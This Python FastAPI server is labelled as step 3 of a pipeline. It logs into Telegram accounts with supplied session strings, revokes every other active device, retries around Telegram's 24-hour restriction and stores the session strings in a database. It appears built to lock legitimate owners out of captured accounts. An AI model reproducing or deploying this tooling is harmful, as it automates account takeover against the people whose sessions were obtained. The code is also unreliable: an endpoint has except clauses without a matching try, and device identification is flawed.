# device_check_server.py

import os
import time
import uuid
import asyncio
import logging
from datetime import datetime, timedelta
from typing import Optional, Dict, Any, List, Tuple

import httpx
import asyncpg
from fastapi import FastAPI, HTTPException, Header, Depends
from fastapi.responses import JSONResponse
from pyrogram.raw.functions.account import GetAuthorizations, ResetAuthorization
from pydantic import BaseModel, Field, validator
from pyrogram import Client
from pyrogram.errors import (
    SessionExpired, 
    SessionRevoked, 
    FloodWait,
    Unauthorized,
    AuthKeyUnregistered
)

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# Load environment variables
from dotenv import load_dotenv
load_dotenv()

# Environment variables
TELEGRAM_API_ID = int(os.getenv("TELEGRAM_API_ID", "0"))
TELEGRAM_API_HASH = os.getenv("TELEGRAM_API_HASH", "")
INTERNAL_API_KEY = os.getenv("INTERNAL_API_KEY", "")
MAIN_SERVER_CALLBACK_URL = os.getenv("MAIN_SERVER_CALLBACK_URL", "")
MAIN_SERVER_RETRY_URL = os.getenv("MAIN_SERVER_RETRY_URL", "")
DEVICE_DB_URL = os.getenv("DEVICE_DB_URL", "")
OUR_DEVICE_MODEL = os.getenv("OUR_DEVICE_MODEL", "")
MAX_CONCURRENT_TASKS = int(os.getenv("MAX_CONCURRENT_TASKS", "10"))

# Semaphore
task_semaphore = asyncio.Semaphore(MAX_CONCURRENT_TASKS)

# Initialize FastAPI app
app = FastAPI(
    title="Step 3: Device Check Server",
    description="Telegram device/session management server",
    version="1.0.0"
)

# Database pool
db_pool: Optional[asyncpg.Pool] = None

# Pydantic models for request validation
class ProcessRequest(BaseModel):
    session_id: str = Field(..., description="Unique session identifier")
    session_string: str = Field(..., description="Pyrogram session string")
    phone_number: str = Field(..., description="Phone number with country code")
    endpoint_name: str = Field(..., description="Bot endpoint name")
    callback_url: Optional[str] = Field(None, description="Success callback URL")
    retry_callback_url: Optional[str] = Field(None, description="Retry callback URL")
    
    @validator('session_id')
    def validate_session_id(cls, v):
        try:
            uuid.UUID(v)
            return v
        except ValueError:
            raise ValueError('Invalid session_id format')
    
    @validator('phone_number')
    def validate_phone(cls, v):
        if not v.startswith('+'):
            raise ValueError('Phone number must start with +')
        return v
    
    @validator('session_string')
    def validate_session_string(cls, v):
        if len(v) < 50:
            raise ValueError('Invalid session string')
        return v

class CallbackData(BaseModel):
    session_id: str
    success: bool
    device_termination_status: Optional[str] = None
    other_devices_terminated: Optional[int] = None
    retry_after_hours: Optional[int] = None
    error: Optional[str] = None
    message: Optional[str] = None

# Retry Manager Class
class RetryManager:
    """Manage retry intervals for device termination"""
    
    # Retry intervals configuration
    RETRY_INTERVALS = [
        {"minutes": 5, "retry_count": 1},      # ৫ মিনিট পর প্রথম রিট্রাই
        {"minutes": 30, "retry_count": 2},     # ৩০ মিনিট পর দ্বিতীয় রিট্রাই
        {"hours": 6, "retry_count": 3},        # ৬ ঘন্টা পর তৃতীয় রিট্রাই (শেষ)
    ]
    
    MAX_RETRIES = 3  # সর্বোচ্চ ৩ বার রিট্রাই
    
    @classmethod
    def get_next_retry_time(cls, current_retry_count: int) -> Optional[datetime]:
        """Get next retry time based on current retry count"""
        for interval in cls.RETRY_INTERVALS:
            if interval["retry_count"] == current_retry_count + 1:
                if "minutes" in interval:
                    return datetime.utcnow() + timedelta(minutes=interval["minutes"])
                elif "hours" in interval:
                    return datetime.utcnow() + timedelta(hours=interval["hours"])
        return None
    
    @classmethod
    def should_send_final_callback(cls, retry_count: int) -> bool:
        """Check if we should send final failure callback"""
        return retry_count > cls.MAX_RETRIES

# Database initialization
async def init_database():
    """Initialize database pool and create tables"""
    global db_pool
    
    try:
        db_pool = await asyncpg.create_pool(
            DEVICE_DB_URL,
            min_size=5,
            max_size=20,
            command_timeout=60
        )
        
        # Create table if not exists with retry support
        async with db_pool.acquire() as conn:
            await conn.execute('''
                CREATE TABLE IF NOT EXISTS device_checks (
                    id SERIAL PRIMARY KEY,
                    session_id UUID NOT NULL,
                    session_string TEXT,
                    phone_number VARCHAR(20) NOT NULL,
                    callback_url TEXT,
                    retry_callback_url TEXT,
                    total_devices INTEGER DEFAULT 0,
                    our_device_count INTEGER DEFAULT 0,
                    other_devices_terminated INTEGER DEFAULT 0,
                    termination_status VARCHAR(50),
                    wait_until TIMESTAMP,
                    checked_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    processing_time_ms INTEGER,
                    is_completed BOOLEAN DEFAULT FALSE,
                    retry_count INTEGER DEFAULT 0,
                    next_retry_at TIMESTAMP,
                    last_error TEXT
                );
                
                CREATE INDEX IF NOT EXISTS idx_device_session_id 
                    ON device_checks(session_id);
                CREATE INDEX IF NOT EXISTS idx_device_phone 
                    ON device_checks(phone_number);
                CREATE INDEX IF NOT EXISTS idx_device_checked_at 
                    ON device_checks(checked_at);
                CREATE INDEX IF NOT EXISTS idx_device_retry 
                    ON device_checks(next_retry_at) 
                    WHERE is_completed = FALSE;
                CREATE INDEX IF NOT EXISTS idx_device_pending_retries 
                    ON device_checks(is_completed, next_retry_at) 
                    WHERE is_completed = FALSE AND next_retry_at IS NOT NULL;
            ''')
        
        logger.info("Database initialized successfully")
    except Exception as e:
        logger.error(f"Database initialization failed: {e}")
        raise

# Authentication dependency
async def verify_internal_key(x_internal_key: str = Header(...)):
    """Verify internal API key"""
    if x_internal_key != INTERNAL_API_KEY:
        raise HTTPException(status_code=401, detail="Invalid internal API key")
    return x_internal_key

# Save device check results to database
async def save_device_check_results(
    session_id: str,
    phone_number: str,
    total_devices: int,
    our_device_count: int,
    other_devices_terminated: int,
    termination_status: str,
    wait_until: Optional[datetime],
    processing_time_ms: int,
    session_string: str = None,
    callback_url: str = None,
    retry_callback_url: str = None
):
    """Save device check results to database"""
    try:
        async with db_pool.acquire() as conn:
            await conn.execute('''
                INSERT INTO device_checks 
                (session_id, phone_number, total_devices, our_device_count, 
                 other_devices_terminated, termination_status, wait_until, 
                 processing_time_ms, session_string, callback_url, retry_callback_url)
                VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11)
            ''', 
            uuid.UUID(session_id), 
            phone_number, 
            total_devices,
            our_device_count,
            other_devices_terminated,
            termination_status,
            wait_until,
            processing_time_ms,
            session_string,
            callback_url,
            retry_callback_url
            )
        logger.info(f"Device check results saved for session {session_id}")
    except Exception as e:
        logger.error(f"Failed to save device check results: {e}")

# Update record for retry
async def update_record_for_retry(
    record_id: int,
    retry_count: int,
    next_retry_at: datetime,
    error_status: str
):
    """Update record for next retry"""
    try:
        async with db_pool.acquire() as conn:
            await conn.execute('''
                UPDATE device_checks 
                SET retry_count = $1,
                    next_retry_at = $2,
                    last_error = $3,
                    termination_status = 'retry_scheduled'
                WHERE id = $4
            ''', retry_count, next_retry_at, error_status, record_id)
        logger.info(f"Record {record_id} updated for retry {retry_count}")
    except Exception as e:
        logger.error(f"Failed to update record for retry: {e}")

# Update record on success
async def update_record_success(
    record_id: int,
    result: Dict[str, Any],
    processing_time_ms: int
):
    """Update record on successful termination"""
    try:
        async with db_pool.acquire() as conn:
            await conn.execute('''
                UPDATE device_checks 
                SET is_completed = TRUE,
                    termination_status = 'completed',
                    other_devices_terminated = $1,
                    processing_time_ms = $2,
                    checked_at = CURRENT_TIMESTAMP
                WHERE id = $3
            ''', result.get('terminated_count', 0), processing_time_ms, record_id)
        logger.info(f"Record {record_id} marked as completed")
    except Exception as e:
        logger.error(f"Failed to update record success: {e}")

# Send callback to main server
async def send_callback(
    callback_url: str,
    callback_data: Dict[str, Any]
):
    """Send callback to main server"""
    if not callback_url:
        logger.warning("No callback URL provided, skipping callback")
        return False
        
    try:
        async with httpx.AsyncClient(timeout=30) as http_client:
            response = await http_client.post(
                callback_url,
                json=callback_data,
                headers={"X-Internal-Key": INTERNAL_API_KEY}
            )
            if response.status_code == 200:
                logger.info(f"Callback sent successfully to {callback_url}")
                return True
            else:
                logger.error(f"Callback failed with status {response.status_code}")
                return False
    except Exception as e:
        logger.error(f"Callback error: {e}")
        return False

# Send final failure callback
async def send_final_failure_callback(record_id: int, retry_count: int):
    """Send final failure callback after max retries"""
    async with db_pool.acquire() as conn:
        # রেকর্ড থেকে সেশন আইডি ও কলব্যাক ইউআরএল নিন
        record = await conn.fetchrow(
            "SELECT session_id, retry_callback_url, callback_url FROM device_checks WHERE id = $1",
            record_id
        )
        if not record:
            return
        
        session_id = str(record["session_id"])
        
        # রেকর্ড আপডেট করুন
        await conn.execute('''
            UPDATE device_checks 
            SET is_completed = TRUE,
                termination_status = 'max_retries_exceeded',
                checked_at = CURRENT_TIMESTAMP
            WHERE id = $1
        ''', record_id)
        
        callback_data = {
            "session_id": session_id,
            "success": False,
            "error": "max_retries_exceeded",
            "retry_count": retry_count,
            "message": f"Device termination failed after {retry_count} retries"
        }
        
        callback_url = record["retry_callback_url"] or record["callback_url"] or MAIN_SERVER_RETRY_URL
        await send_callback(callback_url, callback_data)
        logger.info(f"Final failure callback sent for session {session_id}")

# Attempt device termination
async def attempt_device_termination(
    session_id: str,
    session_string: str,
    phone_number: str
) -> Dict[str, Any]:
    """Attempt to terminate devices for a session"""
    client = None
    try:
        # Initialize Pyrogram client
        client = Client(
            f"device_check_{session_id[:8]}_{int(time.time())}",
            api_id=TELEGRAM_API_ID,
            api_hash=TELEGRAM_API_HASH,
            session_string=session_string,
            in_memory=True
        )
        
        # Connect to Telegram
        await client.start()
        logger.info(f"Connected to Telegram successfully. Device: {client.device_model}")
        
        # Get active authorizations
        result = await client.invoke(GetAuthorizations())
        authorizations = result.authorizations
        
        total_devices = len(authorizations)
        our_device_hash = None
        our_device_model = client.device_model if hasattr(client, 'device_model') else ""
        other_devices = []
        
        # Identify our device and others
        for auth in authorizations:
            try:
                device_model = getattr(auth, 'device_model', 'Unknown')
                device_hash = getattr(auth, 'hash', None)
                
                if device_hash is None:
                    continue
                
                is_our_device = False
                
                if hasattr(auth, 'current') and auth.current:
                    is_our_device = True
                
                if not is_our_device and hasattr(auth, 'date_created'):
                    max_date = max(
                        a.date_created for a in authorizations 
                        if hasattr(a, 'date_created')
                    )
                    if auth.date_created == max_date:
                        is_our_device = True
                
                # আমাদের device identification improve করুন
                if is_our_device or device_model == our_device_model or our_device_hash is None:
                    if our_device_hash is None:
                        our_device_hash = device_hash
                    logger.info(f"Our device identified: {device_model}")
                else:
                    other_devices.append(device_hash)
                    logger.info(f"Other device found: {device_model}")
                    
            except Exception as e:
                logger.warning(f"Error processing authorization: {e}")
                continue
        
        # Terminate other devices
        terminated_count = 0
        wait_required = False
        fresh_reset_forbidden = False
        
        for device_hash in other_devices:
            try:
                if isinstance(device_hash, str):
                    device_hash = int(device_hash)
                
                await client.invoke(ResetAuthorization(hash=device_hash))
                terminated_count += 1
                logger.info(f"Terminated device with hash: {str(device_hash)[:10]}...")
                await asyncio.sleep(1)
                
            except FloodWait as e:
                logger.warning(f"FloodWait error: waiting {e.value} seconds")
                wait_required = True
                fresh_reset_forbidden = True
                break
                
            except Exception as e:
                error_str = str(e)
                error_upper = error_str.upper()
                
                if "FRESH_RESET_AUTHORISATION_FORBIDDEN" in error_upper or \
                   "FRESH_CHANGE_ADMINS_FORBIDDEN" in error_upper or \
                   "fresh reset" in error_str.lower():
                    logger.warning("Fresh reset forbidden - need to wait 24h")
                    fresh_reset_forbidden = True
                    wait_required = True
                    break
                elif "HASH_INVALID" in error_upper:
                    logger.warning(f"Invalid hash for device: {str(device_hash)[:10]}...")
                    continue
                else:
                    logger.error(f"Error terminating device: {e}")
                    continue
        
        return {
            "success": not wait_required,
            "status": "waiting_24h" if wait_required else "completed",
            "terminated_count": terminated_count,
            "total_devices": total_devices,
            "our_device_count": 1 if our_device_hash else 0,
            "message": f"Terminated {terminated_count} devices" if not wait_required else "Fresh reset wait required"
        }
        
    except SessionExpired:
        return {"success": False, "status": "session_error", "message": "Session expired"}
    except SessionRevoked:
        return {"success": False, "status": "session_error", "message": "Session revoked"}
    except Unauthorized:
        return {"success": False, "status": "auth_error", "message": "Unauthorized"}
    except AuthKeyUnregistered:
        return {"success": False, "status": "auth_error", "message": "Auth key unregistered"}
    except Exception as e:
        logger.error(f"Unexpected error in attempt_device_termination: {e}")
        return {"success": False, "status": "unknown_error", "message": str(e)}
    finally:
        if client:
            try:
                await client.stop()
            except:
                pass

# Process single retry
async def process_single_retry(record: Dict[str, Any]):
    """Process a single retry record"""
    try:
        record_id = record["id"]
        session_id = str(record["session_id"])
        retry_count = record["retry_count"]
        start_time = time.time()
        
        logger.info(f"Processing retry {retry_count} for session {session_id}")
        
        # টারমিনেশন চেষ্টা
        result = await attempt_device_termination(
            session_id,
            record["session_string"],
            record["phone_number"]
        )
        
        processing_time = int((time.time() - start_time) * 1000)
        
        if result["success"]:
            await update_record_success(record_id, result, processing_time)
            
            # সাকসেস কলব্যাক পাঠান
            async with db_pool.acquire() as conn:
                row = await conn.fetchrow(
                    "SELECT callback_url FROM device_checks WHERE id = $1",
                    record_id
                )
                if row and row["callback_url"]:
                    callback_data = {
                        "session_id": session_id,
                        "success": True,
                        "device_termination_status": "completed",
                        "other_devices_terminated": result.get("terminated_count", 0),
                        "message": "Device termination completed successfully"
                    }
                    await send_callback(row["callback_url"], callback_data)
            
            logger.info(f"Successfully terminated devices for session {session_id} on retry {retry_count}")
            return
        
        # সেশন এরর (রিট্রাই অসম্ভব)
        if result["status"] in ["session_error", "auth_error"]:
            async with db_pool.acquire() as conn:
                await conn.execute('''
                    UPDATE device_checks 
                    SET is_completed = TRUE,
                        termination_status = $1,
                        checked_at = CURRENT_TIMESTAMP,
                        processing_time_ms = $2
                    WHERE id = $3
                ''', result["status"], processing_time, record_id)
                
                row = await conn.fetchrow(
                    "SELECT callback_url FROM device_checks WHERE id = $1",
                    record_id
                )
                if row:
                    callback_data = {
                        "session_id": session_id,
                        "success": False,
                        "error": result["status"],
                        "message": result.get("message", "Session error")
                    }
                    await send_callback(row["callback_url"], callback_data)
            
            logger.info(f"Session error for {session_id} on retry {retry_count}")
            return
        
        # পরবর্তী রিট্রাই শিডিউল
        next_retry = RetryManager.get_next_retry_time(retry_count)
        
        if next_retry and not RetryManager.should_send_final_callback(retry_count + 1):
            await update_record_for_retry(
                record_id,
                retry_count + 1,
                next_retry,
                result["status"]
            )
            logger.info(f"Scheduled retry {retry_count + 1} for session {session_id} at {next_retry}")
        else:
            # সর্বোচ্চ রিট্রাই পেরিয়ে গেছে
            await send_final_failure_callback(record_id, retry_count + 1)
            logger.info(f"Max retries exceeded for session {session_id}")
            
    except Exception as e:
        logger.error(f"Error processing retry for record {record['id']}: {e}")

# Process pending retries
async def process_pending_retries():
    """Process pending retries that are due"""
    try:
        async with db_pool.acquire() as conn:
            # পেন্ডিং রেকর্ড খুঁজুন যেগুলোর রিট্রাই টাইম এসে গেছে
            records = await conn.fetch('''
                SELECT id, session_id, session_string, phone_number, 
                       retry_count, callback_url, retry_callback_url
                FROM device_checks 
                WHERE is_completed = FALSE 
                AND next_retry_at IS NOT NULL 
                AND next_retry_at <= CURRENT_TIMESTAMP
                ORDER BY next_retry_at ASC
                LIMIT 10
            ''')
            
            if records:
                logger.info(f"Found {len(records)} pending retries to process")
                for record in records:
                    await process_single_retry(dict(record))
            else:
                logger.debug("No pending retries to process")
                
    except Exception as e:
        logger.error(f"Error processing pending retries: {e}")

# Background task for processing retries
async def background_retry_processor():
    """Background task to process retries every 30 seconds"""
    logger.info("Background retry processor started")
    while True:
        try:
            await process_pending_retries()
        except Exception as e:
            logger.error(f"Background retry processor error: {e}")
        await asyncio.sleep(30)  # প্রতি ৩০ সেকেন্ড পর চেক করুন

# Identify our device and others (for initial processing)
async def identify_devices(client: Client) -> Tuple[Optional[int], List[int], int, str]:
    """
    Identify our device and other devices
    Returns: (our_device_hash, other_device_hashes, total_devices, our_device_model)
    """
    try:
        result = await client.invoke(GetAuthorizations())
        authorizations = result.authorizations
        
        total_devices = len(authorizations)
        our_device_hash = None
        our_device_model = ""
        other_devices = []
        
        me = await client.get_me()
        logger.info(f"Current session device info: {client.device_model}")
        our_device_model = client.device_model if hasattr(client, 'device_model') else ""
        
        for auth in authorizations:
            try:
                device_model = getattr(auth, 'device_model', 'Unknown')
                device_hash = getattr(auth, 'hash', None)
                
                if device_hash is None:
                    continue
                
                is_our_device = False
                
                if hasattr(auth, 'current') and auth.current:
                    is_our_device = True
                
                if not is_our_device and hasattr(auth, 'date_created'):
                    max_date = max(a.date_created for a in authorizations if hasattr(a, 'date_created'))
                    if auth.date_created == max_date:
                        is_our_device = True
                
                if is_our_device or device_model == our_device_model:
                    our_device_hash = device_hash
                    logger.info(f"Our device identified: {device_model}")
                else:
                    other_devices.append(device_hash)
                    logger.info(f"Other device found: {device_model}")
                    
            except Exception as e:
                logger.warning(f"Error processing authorization: {e}")
                continue
        
        return our_device_hash, other_devices, total_devices, our_device_model
    except Exception as e:
        logger.error(f"Failed to get authorizations: {e}")
        raise

# Terminate other devices (for initial processing)
async def terminate_other_devices(
    client: Client, 
    other_devices: List[int]
) -> Tuple[int, bool, bool]:
    """
    Terminate other devices
    Returns: (terminated_count, wait_required, fresh_reset_forbidden)
    """
    terminated = 0
    wait_required = False
    fresh_reset_forbidden = False
    
    for device_hash in other_devices:
        try:
            if isinstance(device_hash, str):
                device_hash = int(device_hash)
            
            await client.invoke(ResetAuthorization(hash=device_hash))
            terminated += 1
            logger.info(f"Terminated device with hash: {str(device_hash)[:10]}...")
            await asyncio.sleep(1)
            
        except FloodWait as e:
            logger.warning(f"FloodWait error: waiting {e.value} seconds")
            wait_required = True
            fresh_reset_forbidden = True
            break
            
        except Exception as e:
            error_str = str(e)
            error_upper = error_str.upper()
            
            if "FRESH_RESET_AUTHORISATION_FORBIDDEN" in error_upper or \
               "FRESH_CHANGE_ADMINS_FORBIDDEN" in error_upper or \
               "fresh reset" in error_str.lower():
                logger.warning("Fresh reset forbidden - need to wait 24h")
                fresh_reset_forbidden = True
                wait_required = True
                break
            elif "HASH_INVALID" in error_upper:
                logger.warning(f"Invalid hash for device: {str(device_hash)[:10]}...")
                continue
            else:
                logger.error(f"Error terminating device: {e}")
                continue
    
    return terminated, wait_required, fresh_reset_forbidden

# Main processing function
async def process_device_check(request: ProcessRequest):
    """Main device check processing function"""
    start_time = time.time()
    client = None
    termination_status = "unknown"
    wait_until = None
    
    try:
        # Initialize Pyrogram client
        logger.info(f"Starting device check for session {request.session_id}")
        client = Client(
            f"device_check_{request.session_id[:8]}_{int(time.time())}",
            api_id=TELEGRAM_API_ID,
            api_hash=TELEGRAM_API_HASH,
            session_string=request.session_string,
            in_memory=True
        )
        
        # Connect to Telegram
        await client.start()
        logger.info(f"Connected to Telegram successfully. Device: {client.device_model}")
        
        # Get active authorizations
        our_device_hash, other_devices, total_devices, our_device_model = await identify_devices(client)
        
        # Check if we found our device
        our_device_count = 1 if our_device_hash else 0
        
        # Terminate other devices
        terminated = 0
        wait_required = False
        
        if other_devices:
            terminated, wait_required, fresh_reset = await terminate_other_devices(client, other_devices)
            
            if fresh_reset or wait_required:
                logger.info("Fresh reset restriction detected - scheduling retries")
                termination_status = "waiting_24h"
                wait_until = datetime.utcnow() + timedelta(hours=24)
            else:
                termination_status = "all_terminated"
                logger.info(f"All devices terminated: {terminated} devices")
        else:
            termination_status = "no_other_devices"
            logger.info("No other devices to terminate")
        
        # Calculate processing time
        processing_time = int((time.time() - start_time) * 1000)
        
        # Save results to database
        await save_device_check_results(
            session_id=request.session_id,
            phone_number=request.phone_number,
            total_devices=total_devices,
            our_device_count=our_device_count,
            other_devices_terminated=terminated,
            termination_status=termination_status,
            wait_until=wait_until,
            processing_time_ms=processing_time,
            session_string=request.session_string,
            callback_url=request.callback_url,
            retry_callback_url=request.retry_callback_url
        )
        
        # Prepare callback data
        if wait_required:
            # Schedule first retry
            record_id = None
            async with db_pool.acquire() as conn:
                row = await conn.fetchrow(
                    "SELECT id FROM device_checks WHERE session_id = $1 ORDER BY id DESC LIMIT 1",
                    uuid.UUID(request.session_id)
                )
                if row:
                    record_id = row["id"]
                    first_retry_time = RetryManager.get_next_retry_time(0)
                    if first_retry_time:
                        await update_record_for_retry(
                            record_id,
                            1,
                            first_retry_time,
                            "waiting_24h"
                        )
            
            callback_data = {
                "session_id": request.session_id,
                "success": False,
                "device_termination_status": "waiting_24h",
                "retry_after_hours": 24,
                "message": "Fresh device change wait required (24h) - retry scheduled"
            }
            callback_url = request.retry_callback_url or MAIN_SERVER_RETRY_URL
        else:
            # Mark as completed
            async with db_pool.acquire() as conn:
                await conn.execute('''
                    UPDATE device_checks 
                    SET is_completed = TRUE
                    WHERE session_id = $1
                ''', uuid.UUID(request.session_id))
            
            callback_data = {
                "session_id": request.session_id,
                "success": True,
                "device_termination_status": termination_status,
                "other_devices_terminated": terminated,
                "message": f"Device check completed. Terminated {terminated} other devices"
            }
            callback_url = request.callback_url or MAIN_SERVER_CALLBACK_URL
        
        # Send callback to main server
        await send_callback(callback_url, callback_data)
        
        return {
            "success": True,
            "session_id": request.session_id,
            "device_termination_status": termination_status,
            "other_devices_terminated": terminated,
            "total_devices": total_devices,
            "processing_time_ms": processing_time
        }
        
    except SessionExpired:
        logger.error("Session expired")
        callback_data = {
            "session_id": request.session_id,
            "success": False,
            "error": "SessionExpired",
            "message": "Session expired"
        }
        await send_callback(request.callback_url or MAIN_SERVER_CALLBACK_URL, callback_data)
        raise HTTPException(status_code=401, detail="Session expired")
        
    except SessionRevoked:
        logger.error("Session revoked")
        callback_data = {
            "session_id": request.session_id,
            "success": False,
            "error": "SessionRevoked",
            "message": "Session revoked"
        }
        await send_callback(request.callback_url or MAIN_SERVER_CALLBACK_URL, callback_data)
        raise HTTPException(status_code=401, detail="Session revoked")
        
    except Unauthorized:
        logger.error("Unauthorized access")
        callback_data = {
            "session_id": request.session_id,
            "success": False,
            "error": "Unauthorized",
            "message": "Unauthorized access"
        }
        await send_callback(request.callback_url or MAIN_SERVER_CALLBACK_URL, callback_data)
        raise HTTPException(status_code=401, detail="Unauthorized")
        
    except AuthKeyUnregistered:
        logger.error("Auth key unregistered")
        callback_data = {
            "session_id": request.session_id,
            "success": False,
            "error": "AuthKeyUnregistered",
            "message": "Auth key unregistered"
        }
        await send_callback(request.callback_url or MAIN_SERVER_CALLBACK_URL, callback_data)
        raise HTTPException(status_code=401, detail="Auth key unregistered")
        
    except Exception as e:
        logger.error(f"Unexpected error: {e}")
        callback_data = {
            "session_id": request.session_id,
            "success": False,
            "error": str(e),
            "message": "Internal server error"
        }
        await send_callback(request.callback_url or MAIN_SERVER_CALLBACK_URL, callback_data)
        raise HTTPException(status_code=500, detail="Internal server error")
        
    finally:
        # Disconnect client
        if client:
            try:
                await client.stop()
                logger.info("Client disconnected")
            except:
                pass

# API endpoints
@app.post("/process")
async def process_endpoint(request: ProcessRequest, x_internal_key: str = Depends(verify_internal_key)):
    async with task_semaphore:
        result = await process_device_check(request)
        return JSONResponse(content=result, status_code=200)
    except HTTPException as e:
        raise e
    except Exception as e:
        logger.error(f"Endpoint error: {e}")
        raise HTTPException(status_code=500, detail="Internal server error")

@app.get("/health")
async def health_check():
    """Health check endpoint"""
    health_data = {
        "status": "healthy",
        "service": "device-check-server",
        "timestamp": datetime.utcnow().isoformat(),
        "database_connected": db_pool is not None,
        "retry_processor_running": True
    }
    
    # Check database connectivity
    if db_pool:
        try:
            async with db_pool.acquire() as conn:
                await conn.execute("SELECT 1")
            health_data["database_status"] = "connected"
        except:
            health_data["database_status"] = "disconnected"
            health_data["status"] = "degraded"
    
    return JSONResponse(content=health_data, status_code=200 if health_data["status"] == "healthy" else 503)

@app.get("/stats")
async def get_stats(
    x_internal_key: str = Depends(verify_internal_key)
):
    """Get device check statistics"""
    try:
        async with db_pool.acquire() as conn:
            total_checks = await conn.fetchval("SELECT COUNT(*) FROM device_checks")
            total_terminated = await conn.fetchval(
                "SELECT COALESCE(SUM(other_devices_terminated), 0) FROM device_checks"
            )
            waiting_24h = await conn.fetchval(
                "SELECT COUNT(*) FROM device_checks WHERE termination_status = 'waiting_24h' AND is_completed = FALSE"
            )
            pending_retries = await conn.fetchval(
                "SELECT COUNT(*) FROM device_checks WHERE is_completed = FALSE AND next_retry_at IS NOT NULL"
            )
            avg_time = await conn.fetchval(
                "SELECT AVG(processing_time_ms) FROM device_checks"
            )
            
            return {
                "total_checks": total_checks,
                "total_devices_terminated": total_terminated,
                "waiting_24h_count": waiting_24h,
                "pending_retries": pending_retries,
                "average_processing_time_ms": int(avg_time) if avg_time else 0
            }
    except Exception as e:
        logger.error(f"Failed to get stats: {e}")
        raise HTTPException(status_code=500, detail="Failed to get stats")

@app.get("/pending-retries")
async def get_pending_retries(
    x_internal_key: str = Depends(verify_internal_key)
):
    """Get pending retries list"""
    try:
        async with db_pool.acquire() as conn:
            records = await conn.fetch('''
                SELECT session_id, retry_count, next_retry_at, last_error
                FROM device_checks 
                WHERE is_completed = FALSE 
                AND next_retry_at IS NOT NULL
                ORDER BY next_retry_at ASC
            ''')
            
            return {
                "pending_retries": [
                    {
                        "session_id": str(record["session_id"]),
                        "retry_count": record["retry_count"],
                        "next_retry_at": record["next_retry_at"].isoformat() if record["next_retry_at"] else None,
                        "last_error": record["last_error"]
                    }
                    for record in records
                ]
            }
    except Exception as e:
        logger.error(f"Failed to get pending retries: {e}")
        raise HTTPException(status_code=500, detail="Failed to get pending retries")

@app.on_event("startup")
async def startup_event():
    """Initialize on startup"""
    await init_database()
    
    # Start background retry processor
    asyncio.create_task(background_retry_processor())
    
    logger.info("Device Check Server started with retry processor")
    logger.info(f"Retry intervals: 5min, 30min, 6hours (max {RetryManager.MAX_RETRIES} retries)")

# Shutdown event
@app.on_event("shutdown")
async def shutdown_event():
    """Cleanup on shutdown"""
    global db_pool
    if db_pool:
        await db_pool.close()
        logger.info("Database pool closed")

# For testing
if __name__ == "__main__":
    import uvicorn
    uvicorn.run(
        app,
        host="0.0.0.0",
        port=8003,
        log_level="info"
    )
